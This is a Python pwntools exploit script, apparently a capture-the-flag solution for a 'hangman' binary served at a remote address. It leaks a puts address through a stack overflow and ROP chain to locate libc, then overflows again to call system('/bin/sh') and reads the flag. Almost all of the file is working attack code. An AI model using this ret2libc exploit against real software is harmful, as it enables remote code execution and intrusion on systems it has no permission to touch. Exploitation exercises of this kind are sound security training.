#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './hangman_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.remote'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '52.59.124.14', 5020

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x40168e
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

def guess() -> int:
    # random word
    io.sendlineafter(b'>>', b"2")
    
    # play
    io.sendlineafter(b'>>', b"1")
    
    # guess letter
    io.sendlineafter(b'>>', b"1")
    
    # letter
    io.sendlineafter(b':', b"s")
    length = len(io.recvline().strip())

    # give up  
    io.sendlineafter(b'>>', b'3')   
    
    return length

def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    length = 0
    tries = 0
    while(length * 2 < 72):
        length = guess()
        info(f"Leak {tries} : {length}")
        tries += 1
        # break

    payload = b'A' * 24 + p32(0x3) + p32(0x3) + p64(0x0)
    payload += flat([
        rop.find_gadget(['pop rdi', 'ret']).address,
        elf.got['puts'],
        elf.plt['puts'],
        elf.sym['main']
    ])
    io.sendlineafter(b'>>', b"1")
    io.sendlineafter(b'>>', b'2')
    io.sendafter(b':', payload)

    io.recvuntil(b'>> ')
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak - libc.sym['puts']
    # binsh = libc + 0x196031
    # system = libc + 0x04c490
    
    # just realized after exploit
    # that we probably don't need to brute
    # since the word/length is not changed
    length = 0
    tries = 0
    while(length * 2 < 72):
        length = guess()
        info(f"RCE {tries} : {length}")
        tries += 1

    payload = b'A' * 24 + p32(0x3) + p32(0x3) + p64(0x0)
    payload += flat([
        rop.find_gadget(['pop rdi', 'ret']).address,
        next(libc.search(b'/bin/sh\x00')),
        rop.find_gadget(['ret']).address,  
        libc.sym['system']
    ])
    io.sendlineafter(b'>>', b"1")
    io.sendlineafter(b'>>', b'2')
    io.sendafter(b':', payload)

    io.sendline(b'3')
    io.sendline(b'cat flag*')

    success('leak: %#x', leak)
    success('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()